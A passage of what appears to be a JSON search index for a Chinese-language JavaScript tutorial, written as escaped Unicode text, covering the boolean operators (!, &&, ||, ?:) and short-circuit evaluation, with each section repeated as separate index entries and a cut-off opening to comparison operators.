\uff0c\u5219\u8fd4\u56de\u7b2c\u4e8c\u4e2a\u8fd0\u7b97\u5b50\u7684\u503c\uff08\u6ce8\u610f\u662f\u503c\uff0c\u4e0d\u662f\u5e03\u5c14\u503c\uff09\uff1b\u5982\u679c\u7b2c\u4e00\u4e2a\u8fd0\u7b97\u5b50\u7684\u5e03\u5c14\u503c\u4e3a false \uff0c\u5219\u76f4\u63a5\u8fd4\u56de\u7b2c\u4e00\u4e2a\u8fd0\u7b97\u5b50\u7684\u503c\uff0c\u4e14\u4e0d\u518d\u5bf9\u7b2c\u4e8c\u4e2a\u8fd0\u7b97\u5b50\u6c42\u503c\u3002 1 2 3 4 5 6 7 8 9 't' && '' // \"\" 't' && 'f' // \"f\" 't' && ( 1 + 2 ) // 3 '' && 'f' // \"\" '' && '' // \"\" var x = 1 ; ( 1 - 1 ) && ( x += 1 ) // 0 x // 1 \u4e0a\u9762\u4ee3\u7801\u7684\u6700\u540e\u4e00\u4e2a\u4f8b\u5b50\uff0c\u7531\u4e8e\u4e14\u8fd0\u7b97\u7b26\u7684\u7b2c\u4e00\u4e2a\u8fd0\u7b97\u5b50\u7684\u5e03\u5c14\u503c\u4e3a false \uff0c\u5219\u76f4\u63a5\u8fd4\u56de\u5b83\u7684\u503c 0 \uff0c\u800c\u4e0d\u518d\u5bf9\u7b2c\u4e8c\u4e2a\u8fd0\u7b97\u5b50\u6c42\u503c\uff0c\u6240\u4ee5\u53d8\u91cf x \u7684\u503c\u6ca1\u53d8\u3002 \u8fd9\u79cd\u8df3\u8fc7\u7b2c\u4e8c\u4e2a\u8fd0\u7b97\u5b50\u7684\u673a\u5236\uff0c\u88ab\u79f0\u4e3a\u201c\u77ed\u8def\u201d\u3002\u6709\u4e9b\u7a0b\u5e8f\u5458\u559c\u6b22\u7528\u5b83\u53d6\u4ee3 if \u7ed3\u6784\uff0c\u6bd4\u5982\u4e0b\u9762\u662f\u4e00\u6bb5 if \u7ed3\u6784\u7684\u4ee3\u7801\uff0c\u5c31\u53ef\u4ee5\u7528\u4e14\u8fd0\u7b97\u7b26\u6539\u5199\u3002 1 2 3 4 5 6 7 if ( i ) { doSomething (); } // \u7b49\u4ef7\u4e8e i && doSomething (); \u4e0a\u9762\u4ee3\u7801\u7684\u4e24\u79cd\u5199\u6cd5\u662f\u7b49\u4ef7\u7684\uff0c\u4f46\u662f\u540e\u4e00\u79cd\u4e0d\u5bb9\u6613\u770b\u51fa\u76ee\u7684\uff0c\u4e5f\u4e0d\u5bb9\u6613\u9664\u9519\uff0c\u5efa\u8bae\u8c28\u614e\u4f7f\u7528\u3002 \u4e14\u8fd0\u7b97\u7b26\u53ef\u4ee5\u591a\u4e2a\u8fde\u7528\uff0c\u8fd9\u65f6\u8fd4\u56de\u7b2c\u4e00\u4e2a\u5e03\u5c14\u503c\u4e3a false \u7684\u8868\u8fbe\u5f0f\u7684\u503c\u3002\u5982\u679c\u6240\u6709\u8868\u8fbe\u5f0f\u7684\u5e03\u5c14\u503c\u90fd\u4e3a true \uff0c\u5219\u8fd4\u56de\u6700\u540e\u4e00\u4e2a\u8868\u8fbe\u5f0f\u7684\u503c\u3002 1 2 3 4 5 true && 'foo' && '' && 4 && 'foo' && true // '' 1 && 2 && 3 // 3 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u4f8b\u4e00\u91cc\u9762\uff0c\u7b2c\u4e00\u4e2a\u5e03\u5c14\u503c\u4e3a false \u7684\u8868\u8fbe\u5f0f\u4e3a\u7b2c\u4e09\u4e2a\u8868\u8fbe\u5f0f\uff0c\u6240\u4ee5\u5f97\u5230\u4e00\u4e2a\u7a7a\u5b57\u7b26\u4e32\u3002\u4f8b\u4e8c\u91cc\u9762\uff0c\u6240\u6709\u8868\u8fbe\u5f0f\u7684\u5e03\u5c14\u503c\u90fd\u662f true \uff0c\u6240\u4ee5\u8fd4\u56de\u6700\u540e\u4e00\u4e2a\u8868\u8fbe\u5f0f\u7684\u503c 3 \u3002 \u6216\u8fd0\u7b97\u7b26\uff08||\uff09 \u00b6 \u6216\u8fd0\u7b97\u7b26\uff08 || \uff09\u4e5f\u7528\u4e8e\u591a\u4e2a\u8868\u8fbe\u5f0f\u7684\u6c42\u503c\u3002\u5b83\u7684\u8fd0\u7b97\u89c4\u5219\u662f\uff1a\u5982\u679c\u7b2c\u4e00\u4e2a\u8fd0\u7b97\u5b50\u7684\u5e03\u5c14\u503c\u4e3a true \uff0c\u5219\u8fd4\u56de\u7b2c\u4e00\u4e2a\u8fd0\u7b97\u5b50\u7684\u503c\uff0c\u4e14\u4e0d\u518d\u5bf9\u7b2c\u4e8c\u4e2a\u8fd0\u7b97\u5b50\u6c42\u503c\uff1b\u5982\u679c\u7b2c\u4e00\u4e2a\u8fd0\u7b97\u5b50\u7684\u5e03\u5c14\u503c\u4e3a false \uff0c\u5219\u8fd4\u56de\u7b2c\u4e8c\u4e2a\u8fd0\u7b97\u5b50\u7684\u503c\u3002 1 2 3 4 't' || '' // \"t\" 't' || 'f' // \"t\" '' || 'f' // \"f\" '' || '' // \"\" \u77ed\u8def\u89c4\u5219\u5bf9\u8fd9\u4e2a\u8fd0\u7b97\u7b26\u4e5f\u9002\u7528\u3002 1 2 3 var x = 1 ; true || ( x = 2 ) // true x // 1 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6216\u8fd0\u7b97\u7b26\u7684\u7b2c\u4e00\u4e2a\u8fd0\u7b97\u5b50\u4e3a true \uff0c\u6240\u4ee5\u76f4\u63a5\u8fd4\u56de true \uff0c\u4e0d\u518d\u8fd0\u884c\u7b2c\u4e8c\u4e2a\u8fd0\u7b97\u5b50\u3002\u6240\u4ee5\uff0c x \u7684\u503c\u6ca1\u6709\u6539\u53d8\u3002\u8fd9\u79cd\u53ea\u901a\u8fc7\u7b2c\u4e00\u4e2a\u8868\u8fbe\u5f0f\u7684\u503c\uff0c\u63a7\u5236\u662f\u5426\u8fd0\u884c\u7b2c\u4e8c\u4e2a\u8868\u8fbe\u5f0f\u7684\u673a\u5236\uff0c\u5c31\u79f0\u4e3a\u201c\u77ed\u8def\u201d\uff08short-cut\uff09\u3002 \u6216\u8fd0\u7b97\u7b26\u53ef\u4ee5\u591a\u4e2a\u8fde\u7528\uff0c\u8fd9\u65f6\u8fd4\u56de\u7b2c\u4e00\u4e2a\u5e03\u5c14\u503c\u4e3a true \u7684\u8868\u8fbe\u5f0f\u7684\u503c\u3002\u5982\u679c\u6240\u6709\u8868\u8fbe\u5f0f\u90fd\u4e3a false \uff0c\u5219\u8fd4\u56de\u6700\u540e\u4e00\u4e2a\u8868\u8fbe\u5f0f\u7684\u503c\u3002 1 2 3 4 5 false || 0 || '' || 4 || 'foo' || true // 4 false || 0 || '' // '' \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u4f8b\u4e00\u91cc\u9762\uff0c\u7b2c\u4e00\u4e2a\u5e03\u5c14\u503c\u4e3a true \u7684\u8868\u8fbe\u5f0f\u662f\u7b2c\u56db\u4e2a\u8868\u8fbe\u5f0f\uff0c\u6240\u4ee5\u5f97\u5230\u6570\u503c4\u3002\u4f8b\u4e8c\u91cc\u9762\uff0c\u6240\u6709\u8868\u8fbe\u5f0f\u7684\u5e03\u5c14\u503c\u90fd\u4e3a false \uff0c\u6240\u4ee5\u8fd4\u56de\u6700\u540e\u4e00\u4e2a\u8868\u8fbe\u5f0f\u7684\u503c\u3002 \u6216\u8fd0\u7b97\u7b26\u5e38\u7528\u4e8e\u4e3a\u4e00\u4e2a\u53d8\u91cf\u8bbe\u7f6e\u9ed8\u8ba4\u503c\u3002 1 2 3 4 5 6 7 function saveText ( text ) { text = text || '' ; // ... } // \u6216\u8005\u5199\u6210 saveText ( this . text || '' ) \u4e0a\u9762\u4ee3\u7801\u8868\u793a\uff0c\u5982\u679c\u51fd\u6570\u8c03\u7528\u65f6\uff0c\u6ca1\u6709\u63d0\u4f9b\u53c2\u6570\uff0c\u5219\u8be5\u53c2\u6570\u9ed8\u8ba4\u8bbe\u7f6e\u4e3a\u7a7a\u5b57\u7b26\u4e32\u3002 \u4e09\u5143\u6761\u4ef6\u8fd0\u7b97\u7b26\uff08?:\uff09 \u00b6 \u4e09\u5143\u6761\u4ef6\u8fd0\u7b97\u7b26\u7531\u95ee\u53f7\uff08?\uff09\u548c\u5192\u53f7\uff08:\uff09\u7ec4\u6210\uff0c\u5206\u9694\u4e09\u4e2a\u8868\u8fbe\u5f0f\u3002\u5b83\u662f JavaScript \u8bed\u8a00\u552f\u4e00\u4e00\u4e2a\u9700\u8981\u4e09\u4e2a\u8fd0\u7b97\u5b50\u7684\u8fd0\u7b97\u7b26\u3002\u5982\u679c\u7b2c\u4e00\u4e2a\u8868\u8fbe\u5f0f\u7684\u5e03\u5c14\u503c\u4e3a true \uff0c\u5219\u8fd4\u56de\u7b2c\u4e8c\u4e2a\u8868\u8fbe\u5f0f\u7684\u503c\uff0c\u5426\u5219\u8fd4\u56de\u7b2c\u4e09\u4e2a\u8868\u8fbe\u5f0f\u7684\u503c\u3002 1 2 't' ? 'hello' : 'world' // \"hello\" 0 ? 'hello' : 'world' // \"world\" \u4e0a\u9762\u4ee3\u7801\u7684 t \u548c 0 \u7684\u5e03\u5c14\u503c\u5206\u522b\u4e3a true \u548c false \uff0c\u6240\u4ee5\u5206\u522b\u8fd4\u56de\u7b2c\u4e8c\u4e2a\u548c\u7b2c\u4e09\u4e2a\u8868\u8fbe\u5f0f\u7684\u503c\u3002 \u901a\u5e38\u6765\u8bf4\uff0c\u4e09\u5143\u6761\u4ef6\u8868\u8fbe\u5f0f\u4e0e if...else \u8bed\u53e5\u5177\u6709\u540c\u6837\u8868\u8fbe\u6548\u679c\uff0c\u524d\u8005\u53ef\u4ee5\u8868\u8fbe\u7684\uff0c\u540e\u8005\u4e5f\u80fd\u8868\u8fbe\u3002\u4f46\u662f\u4e24\u8005\u5177\u6709\u4e00\u4e2a\u91cd\u5927\u5dee\u522b\uff0c if...else \u662f\u8bed\u53e5\uff0c\u6ca1\u6709\u8fd4\u56de\u503c\uff1b\u4e09\u5143\u6761\u4ef6\u8868\u8fbe\u5f0f\u662f\u8868\u8fbe\u5f0f\uff0c\u5177\u6709\u8fd4\u56de\u503c\u3002\u6240\u4ee5\uff0c\u5728\u9700\u8981\u8fd4\u56de\u503c\u7684\u573a\u5408\uff0c\u53ea\u80fd\u4f7f\u7528\u4e09\u5143\u6761\u4ef6\u8868\u8fbe\u5f0f\uff0c\u800c\u4e0d\u80fd\u4f7f\u7528 if..else \u3002 1 console . log ( true ? 'T' : 'F' ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c console.log \u65b9\u6cd5\u7684\u53c2\u6570\u5fc5\u987b\u662f\u4e00\u4e2a\u8868\u8fbe\u5f0f\uff0c\u8fd9\u65f6\u5c31\u53ea\u80fd\u4f7f\u7528\u4e09\u5143\u6761\u4ef6\u8868\u8fbe\u5f0f\u3002\u5982\u679c\u8981\u7528 if...else \u8bed\u53e5\uff0c\u5c31\u5fc5\u987b\u6539\u53d8\u6574\u4e2a\u4ee3\u7801\u5199\u6cd5\u4e86\u3002","title":"\u5e03\u5c14\u8fd0\u7b97\u7b26"},{"location":"operators/boolean/#_1","text":"","title":"\u5e03\u5c14\u8fd0\u7b97\u7b26"},{"location":"operators/boolean/#_2","text":"\u5e03\u5c14\u8fd0\u7b97\u7b26\u7528\u4e8e\u5c06\u8868\u8fbe\u5f0f\u8f6c\u4e3a\u5e03\u5c14\u503c\uff0c\u4e00\u5171\u5305\u542b\u56db\u4e2a\u8fd0\u7b97\u7b26\u3002 \u53d6\u53cd\u8fd0\u7b97\u7b26\uff1a ! \u4e14\u8fd0\u7b97\u7b26\uff1a && \u6216\u8fd0\u7b97\u7b26\uff1a || \u4e09\u5143\u8fd0\u7b97\u7b26\uff1a ?:","title":"\u6982\u8ff0"},{"location":"operators/boolean/#_3","text":"\u53d6\u53cd\u8fd0\u7b97\u7b26\u662f\u4e00\u4e2a\u611f\u53f9\u53f7\uff0c\u7528\u4e8e\u5c06\u5e03\u5c14\u503c\u53d8\u4e3a\u76f8\u53cd\u503c\uff0c\u5373 true \u53d8\u6210 false \uff0c false \u53d8\u6210 true \u3002 1 2 ! true // false ! false // true \u5bf9\u4e8e\u975e\u5e03\u5c14\u503c\uff0c\u53d6\u53cd\u8fd0\u7b97\u7b26\u4f1a\u5c06\u5176\u8f6c\u4e3a\u5e03\u5c14\u503c\u3002\u53ef\u4ee5\u8fd9\u6837\u8bb0\u5fc6\uff0c\u4ee5\u4e0b\u516d\u4e2a\u503c\u53d6\u53cd\u540e\u4e3a true \uff0c\u5176\u4ed6\u503c\u90fd\u4e3a false \u3002 undefined null false 0 NaN \u7a7a\u5b57\u7b26\u4e32\uff08 '' \uff09 1 2 3 4 5 6 7 8 9 10 ! undefined // true ! null // true ! 0 // true ! NaN // true ! \"\" // true ! 54 // false ! 'hello' // false ! [] // false ! {} // false \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u4e0d\u7ba1\u4ec0\u4e48\u7c7b\u578b\u7684\u503c\uff0c\u7ecf\u8fc7\u53d6\u53cd\u8fd0\u7b97\u540e\uff0c\u90fd\u53d8\u6210\u4e86\u5e03\u5c14\u503c\u3002 \u5982\u679c\u5bf9\u4e00\u4e2a\u503c\u8fde\u7eed\u505a\u4e24\u6b21\u53d6\u53cd\u8fd0\u7b97\uff0c\u7b49\u4e8e\u5c06\u5176\u8f6c\u4e3a\u5bf9\u5e94\u7684\u5e03\u5c14\u503c\uff0c\u4e0e Boolean \u51fd\u6570\u7684\u4f5c\u7528\u76f8\u540c\u3002\u8fd9\u662f\u4e00\u79cd\u5e38\u7528\u7684\u7c7b\u578b\u8f6c\u6362\u7684\u5199\u6cd5\u3002 1 2 3 !! x // \u7b49\u540c\u4e8e Boolean ( x ) \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u4e0d\u7ba1 x \u662f\u4ec0\u4e48\u7c7b\u578b\u7684\u503c\uff0c\u7ecf\u8fc7\u4e24\u6b21\u53d6\u53cd\u8fd0\u7b97\u540e\uff0c\u53d8\u6210\u4e86\u4e0e Boolean \u51fd\u6570\u7ed3\u679c\u76f8\u540c\u7684\u5e03\u5c14\u503c\u3002\u6240\u4ee5\uff0c\u4e24\u6b21\u53d6\u53cd\u5c31\u662f\u5c06\u4e00\u4e2a\u503c\u8f6c\u4e3a\u5e03\u5c14\u503c\u7684\u7b80\u4fbf\u5199\u6cd5\u3002","title":"\u53d6\u53cd\u8fd0\u7b97\u7b26\uff08!\uff09"},{"location":"operators/boolean/#_4","text":"\u4e14\u8fd0\u7b97\u7b26\uff08 && \uff09\u5f80\u5f80\u7528\u4e8e\u591a\u4e2a\u8868\u8fbe\u5f0f\u7684\u6c42\u503c\u3002 \u5b83\u7684\u8fd0\u7b97\u89c4\u5219\u662f\uff1a\u5982\u679c\u7b2c\u4e00\u4e2a\u8fd0\u7b97\u5b50\u7684\u5e03\u5c14\u503c\u4e3a true \uff0c\u5219\u8fd4\u56de\u7b2c\u4e8c\u4e2a\u8fd0\u7b97\u5b50\u7684\u503c\uff08\u6ce8\u610f\u662f\u503c\uff0c\u4e0d\u662f\u5e03\u5c14\u503c\uff09\uff1b\u5982\u679c\u7b2c\u4e00\u4e2a\u8fd0\u7b97\u5b50\u7684\u5e03\u5c14\u503c\u4e3a false \uff0c\u5219\u76f4\u63a5\u8fd4\u56de\u7b2c\u4e00\u4e2a\u8fd0\u7b97\u5b50\u7684\u503c\uff0c\u4e14\u4e0d\u518d\u5bf9\u7b2c\u4e8c\u4e2a\u8fd0\u7b97\u5b50\u6c42\u503c\u3002 1 2 3 4 5 6 7 8 9 't' && '' // \"\" 't' && 'f' // \"f\" 't' && ( 1 + 2 ) // 3 '' && 'f' // \"\" '' && '' // \"\" var x = 1 ; ( 1 - 1 ) && ( x += 1 ) // 0 x // 1 \u4e0a\u9762\u4ee3\u7801\u7684\u6700\u540e\u4e00\u4e2a\u4f8b\u5b50\uff0c\u7531\u4e8e\u4e14\u8fd0\u7b97\u7b26\u7684\u7b2c\u4e00\u4e2a\u8fd0\u7b97\u5b50\u7684\u5e03\u5c14\u503c\u4e3a false \uff0c\u5219\u76f4\u63a5\u8fd4\u56de\u5b83\u7684\u503c 0 \uff0c\u800c\u4e0d\u518d\u5bf9\u7b2c\u4e8c\u4e2a\u8fd0\u7b97\u5b50\u6c42\u503c\uff0c\u6240\u4ee5\u53d8\u91cf x \u7684\u503c\u6ca1\u53d8\u3002 \u8fd9\u79cd\u8df3\u8fc7\u7b2c\u4e8c\u4e2a\u8fd0\u7b97\u5b50\u7684\u673a\u5236\uff0c\u88ab\u79f0\u4e3a\u201c\u77ed\u8def\u201d\u3002\u6709\u4e9b\u7a0b\u5e8f\u5458\u559c\u6b22\u7528\u5b83\u53d6\u4ee3 if \u7ed3\u6784\uff0c\u6bd4\u5982\u4e0b\u9762\u662f\u4e00\u6bb5 if \u7ed3\u6784\u7684\u4ee3\u7801\uff0c\u5c31\u53ef\u4ee5\u7528\u4e14\u8fd0\u7b97\u7b26\u6539\u5199\u3002 1 2 3 4 5 6 7 if ( i ) { doSomething (); } // \u7b49\u4ef7\u4e8e i && doSomething (); \u4e0a\u9762\u4ee3\u7801\u7684\u4e24\u79cd\u5199\u6cd5\u662f\u7b49\u4ef7\u7684\uff0c\u4f46\u662f\u540e\u4e00\u79cd\u4e0d\u5bb9\u6613\u770b\u51fa\u76ee\u7684\uff0c\u4e5f\u4e0d\u5bb9\u6613\u9664\u9519\uff0c\u5efa\u8bae\u8c28\u614e\u4f7f\u7528\u3002 \u4e14\u8fd0\u7b97\u7b26\u53ef\u4ee5\u591a\u4e2a\u8fde\u7528\uff0c\u8fd9\u65f6\u8fd4\u56de\u7b2c\u4e00\u4e2a\u5e03\u5c14\u503c\u4e3a false \u7684\u8868\u8fbe\u5f0f\u7684\u503c\u3002\u5982\u679c\u6240\u6709\u8868\u8fbe\u5f0f\u7684\u5e03\u5c14\u503c\u90fd\u4e3a true \uff0c\u5219\u8fd4\u56de\u6700\u540e\u4e00\u4e2a\u8868\u8fbe\u5f0f\u7684\u503c\u3002 1 2 3 4 5 true && 'foo' && '' && 4 && 'foo' && true // '' 1 && 2 && 3 // 3 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u4f8b\u4e00\u91cc\u9762\uff0c\u7b2c\u4e00\u4e2a\u5e03\u5c14\u503c\u4e3a false \u7684\u8868\u8fbe\u5f0f\u4e3a\u7b2c\u4e09\u4e2a\u8868\u8fbe\u5f0f\uff0c\u6240\u4ee5\u5f97\u5230\u4e00\u4e2a\u7a7a\u5b57\u7b26\u4e32\u3002\u4f8b\u4e8c\u91cc\u9762\uff0c\u6240\u6709\u8868\u8fbe\u5f0f\u7684\u5e03\u5c14\u503c\u90fd\u662f true \uff0c\u6240\u4ee5\u8fd4\u56de\u6700\u540e\u4e00\u4e2a\u8868\u8fbe\u5f0f\u7684\u503c 3 \u3002","title":"\u4e14\u8fd0\u7b97\u7b26\uff08&amp;&amp;\uff09"},{"location":"operators/boolean/#_5","text":"\u6216\u8fd0\u7b97\u7b26\uff08 || \uff09\u4e5f\u7528\u4e8e\u591a\u4e2a\u8868\u8fbe\u5f0f\u7684\u6c42\u503c\u3002\u5b83\u7684\u8fd0\u7b97\u89c4\u5219\u662f\uff1a\u5982\u679c\u7b2c\u4e00\u4e2a\u8fd0\u7b97\u5b50\u7684\u5e03\u5c14\u503c\u4e3a true \uff0c\u5219\u8fd4\u56de\u7b2c\u4e00\u4e2a\u8fd0\u7b97\u5b50\u7684\u503c\uff0c\u4e14\u4e0d\u518d\u5bf9\u7b2c\u4e8c\u4e2a\u8fd0\u7b97\u5b50\u6c42\u503c\uff1b\u5982\u679c\u7b2c\u4e00\u4e2a\u8fd0\u7b97\u5b50\u7684\u5e03\u5c14\u503c\u4e3a false \uff0c\u5219\u8fd4\u56de\u7b2c\u4e8c\u4e2a\u8fd0\u7b97\u5b50\u7684\u503c\u3002 1 2 3 4 't' || '' // \"t\" 't' || 'f' // \"t\" '' || 'f' // \"f\" '' || '' // \"\" \u77ed\u8def\u89c4\u5219\u5bf9\u8fd9\u4e2a\u8fd0\u7b97\u7b26\u4e5f\u9002\u7528\u3002 1 2 3 var x = 1 ; true || ( x = 2 ) // true x // 1 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6216\u8fd0\u7b97\u7b26\u7684\u7b2c\u4e00\u4e2a\u8fd0\u7b97\u5b50\u4e3a true \uff0c\u6240\u4ee5\u76f4\u63a5\u8fd4\u56de true \uff0c\u4e0d\u518d\u8fd0\u884c\u7b2c\u4e8c\u4e2a\u8fd0\u7b97\u5b50\u3002\u6240\u4ee5\uff0c x \u7684\u503c\u6ca1\u6709\u6539\u53d8\u3002\u8fd9\u79cd\u53ea\u901a\u8fc7\u7b2c\u4e00\u4e2a\u8868\u8fbe\u5f0f\u7684\u503c\uff0c\u63a7\u5236\u662f\u5426\u8fd0\u884c\u7b2c\u4e8c\u4e2a\u8868\u8fbe\u5f0f\u7684\u673a\u5236\uff0c\u5c31\u79f0\u4e3a\u201c\u77ed\u8def\u201d\uff08short-cut\uff09\u3002 \u6216\u8fd0\u7b97\u7b26\u53ef\u4ee5\u591a\u4e2a\u8fde\u7528\uff0c\u8fd9\u65f6\u8fd4\u56de\u7b2c\u4e00\u4e2a\u5e03\u5c14\u503c\u4e3a true \u7684\u8868\u8fbe\u5f0f\u7684\u503c\u3002\u5982\u679c\u6240\u6709\u8868\u8fbe\u5f0f\u90fd\u4e3a false \uff0c\u5219\u8fd4\u56de\u6700\u540e\u4e00\u4e2a\u8868\u8fbe\u5f0f\u7684\u503c\u3002 1 2 3 4 5 false || 0 || '' || 4 || 'foo' || true // 4 false || 0 || '' // '' \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u4f8b\u4e00\u91cc\u9762\uff0c\u7b2c\u4e00\u4e2a\u5e03\u5c14\u503c\u4e3a true \u7684\u8868\u8fbe\u5f0f\u662f\u7b2c\u56db\u4e2a\u8868\u8fbe\u5f0f\uff0c\u6240\u4ee5\u5f97\u5230\u6570\u503c4\u3002\u4f8b\u4e8c\u91cc\u9762\uff0c\u6240\u6709\u8868\u8fbe\u5f0f\u7684\u5e03\u5c14\u503c\u90fd\u4e3a false \uff0c\u6240\u4ee5\u8fd4\u56de\u6700\u540e\u4e00\u4e2a\u8868\u8fbe\u5f0f\u7684\u503c\u3002 \u6216\u8fd0\u7b97\u7b26\u5e38\u7528\u4e8e\u4e3a\u4e00\u4e2a\u53d8\u91cf\u8bbe\u7f6e\u9ed8\u8ba4\u503c\u3002 1 2 3 4 5 6 7 function saveText ( text ) { text = text || '' ; // ... } // \u6216\u8005\u5199\u6210 saveText ( this . text || '' ) \u4e0a\u9762\u4ee3\u7801\u8868\u793a\uff0c\u5982\u679c\u51fd\u6570\u8c03\u7528\u65f6\uff0c\u6ca1\u6709\u63d0\u4f9b\u53c2\u6570\uff0c\u5219\u8be5\u53c2\u6570\u9ed8\u8ba4\u8bbe\u7f6e\u4e3a\u7a7a\u5b57\u7b26\u4e32\u3002","title":"\u6216\u8fd0\u7b97\u7b26\uff08||\uff09"},{"location":"operators/boolean/#_6","text":"\u4e09\u5143\u6761\u4ef6\u8fd0\u7b97\u7b26\u7531\u95ee\u53f7\uff08?\uff09\u548c\u5192\u53f7\uff08:\uff09\u7ec4\u6210\uff0c\u5206\u9694\u4e09\u4e2a\u8868\u8fbe\u5f0f\u3002\u5b83\u662f JavaScript \u8bed\u8a00\u552f\u4e00\u4e00\u4e2a\u9700\u8981\u4e09\u4e2a\u8fd0\u7b97\u5b50\u7684\u8fd0\u7b97\u7b26\u3002\u5982\u679c\u7b2c\u4e00\u4e2a\u8868\u8fbe\u5f0f\u7684\u5e03\u5c14\u503c\u4e3a true \uff0c\u5219\u8fd4\u56de\u7b2c\u4e8c\u4e2a\u8868\u8fbe\u5f0f\u7684\u503c\uff0c\u5426\u5219\u8fd4\u56de\u7b2c\u4e09\u4e2a\u8868\u8fbe\u5f0f\u7684\u503c\u3002 1 2 't' ? 'hello' : 'world' // \"hello\" 0 ? 'hello' : 'world' // \"world\" \u4e0a\u9762\u4ee3\u7801\u7684 t \u548c 0 \u7684\u5e03\u5c14\u503c\u5206\u522b\u4e3a true \u548c false \uff0c\u6240\u4ee5\u5206\u522b\u8fd4\u56de\u7b2c\u4e8c\u4e2a\u548c\u7b2c\u4e09\u4e2a\u8868\u8fbe\u5f0f\u7684\u503c\u3002 \u901a\u5e38\u6765\u8bf4\uff0c\u4e09\u5143\u6761\u4ef6\u8868\u8fbe\u5f0f\u4e0e if...else \u8bed\u53e5\u5177\u6709\u540c\u6837\u8868\u8fbe\u6548\u679c\uff0c\u524d\u8005\u53ef\u4ee5\u8868\u8fbe\u7684\uff0c\u540e\u8005\u4e5f\u80fd\u8868\u8fbe\u3002\u4f46\u662f\u4e24\u8005\u5177\u6709\u4e00\u4e2a\u91cd\u5927\u5dee\u522b\uff0c if...else \u662f\u8bed\u53e5\uff0c\u6ca1\u6709\u8fd4\u56de\u503c\uff1b\u4e09\u5143\u6761\u4ef6\u8868\u8fbe\u5f0f\u662f\u8868\u8fbe\u5f0f\uff0c\u5177\u6709\u8fd4\u56de\u503c\u3002\u6240\u4ee5\uff0c\u5728\u9700\u8981\u8fd4\u56de\u503c\u7684\u573a\u5408\uff0c\u53ea\u80fd\u4f7f\u7528\u4e09\u5143\u6761\u4ef6\u8868\u8fbe\u5f0f\uff0c\u800c\u4e0d\u80fd\u4f7f\u7528 if..else \u3002 1 console . log ( true ? 'T' : 'F' ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c console.log \u65b9\u6cd5\u7684\u53c2\u6570\u5fc5\u987b\u662f\u4e00\u4e2a\u8868\u8fbe\u5f0f\uff0c\u8fd9\u65f6\u5c31\u53ea\u80fd\u4f7f\u7528\u4e09\u5143\u6761\u4ef6\u8868\u8fbe\u5f0f\u3002\u5982\u679c\u8981\u7528 if...else \u8bed\u53e5\uff0c\u5c31\u5fc5\u987b\u6539\u53d8\u6574\u4e2a\u4ee3\u7801\u5199\u6cd5\u4e86\u3002","title":"\u4e09\u5143\u6761\u4ef6\u8fd0\u7b97\u7b26\uff08?:\uff09"},{"location":"operators/comparison/","text":"\u6bd4\u8f83\u8fd0\u7b97\u7b26 \u00b6 \u6982\u8ff0 \u00b6 \u6bd4\u8f83\u8fd0\u7b97\u7b26\u7528\u4e8e\u6bd4\u8f83\u4e24\u4e2a\u503c\u7684\u5927\u5c0f\uff0c\u7136\u540e\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u662f\u5426\u6ee1\u8db3\u6307\u5b9a\u7684\u6761\u4ef6\u3002 1 2 > 1 // true \u4e0a\u9762\u4ee3\u7801\u6bd4\u8f83 2 \u662f\u5426\u5927\u4e8e 1 \uff0c\u8fd4\u56de true \u3002 \u6ce8\u610f\uff0c\u6bd4\u8f83\u8fd0\u7b97\u7b26\u53ef\u4ee5\u6bd4\u8f83\u5404\u79cd\u7c7b\u578b\u7684\u503c\uff0c\u4e0d\u4ec5\u4ec5\u662f\u6570\u503c\u3002 JavaScript \u4e00\u5171\u63d0\u4f9b\u4e868\u4e2a\u6bd4\u8f83\u8fd0\u7b97\u7b26\u3002 > \u5927\u4e8e\u8fd0\u7b97\u7b26 < \u5c0f\u4e8e\u8fd0\u7b97\u7b26 <= \u5c0f\u4e8e\u6216\u7b49\u4e8e\u8fd0\u7b97\u7b26 >= \u5927\u4e8e\u6216\u7b49\u4e8e\u8fd0\u7b97\u7b26 == \u76f8\u7b49\u8fd0\u7b97\u7b26 === \u4e25\u683c\u76f8\u7b49\u8fd0\u7b97\u7b26 != \u4e0d\u76f8\u7b49\u8fd0\u7b97\u7b26 !== \u4e25\u683c\u4e0d\u76f8\u7b49\u8fd0\u7b97\u7b26 \u8fd9\u516b\u4e2a\u6bd4\u8f83\u8fd0\u7b97\u7b26\u5206\u6210\u4e24\u7c7b\uff1a\u76f8\u7b49\u6bd4\u8f83\u548c\u975e\u76f8\u7b49\u6bd4\u8f83\u3002\u4e24\u8005\u7684\u89c4\u5219\u662f\u4e0d\u4e00\u6837\u7684\uff0c\u5bf9\u4e8e\u975e\u76f8\u7b49\u7684\u6bd4\u8f83\uff0c\u7b97\u6cd5\u662f\u5148\u770b\u4e24\u4e2a\u8fd0\u7b97\u5b50\u662f\u5426\u90fd\u662f\u5b57\u7b26\u4e32\uff0c\u5982\u679c\u662f\u7684\uff0c\u5c31\u6309\u7167\u5b57\u5178\u987a\u5e8f\u6bd4\u8f83\uff08\u5b9e\u9645\u4e0a\u662f\u6bd4\u8f83 Unicode \u7801\u70b9\uff09\uff1b\u5426\u5219\uff0c\u5c06\u4e24\u4e2a\u8fd0\u7b97\u5b50\u90fd\u8f6c\u6210\u6570\u503c\uff0c\u518d\u6bd4\u8f83\u6570\u503c\u7684\u5927\u5c0f\u3002 \u975e\u76f8\u7b49\u8fd0\u7b97\u7b26\uff1a\u5b57\u7b26\u4e32\u7684\u6bd4\u8f83 \u00b6 \u5b57\u7b26\u4e32\u6309\u7167\u5b57\u5178\u987a\u5e8f\u8fdb\u884c\u6bd4\u8f83\u3002 1 2 'cat' > 'dog' // false 'cat' > 'catalog' // false JavaScript \u5f15\u64ce\u5185\u90e8\u9996\u5148\u6bd4\u8f83\u9996\u5b57\u7b26\u7684 Unicode \u7801\u70b9\u3002\u5982\u679c\u76f8\u7b49\uff0c\u518d\u6bd4\u8f83\u7b2c\u4e8c\u4e2a\u5b57\u7b26\u7684 Unicode 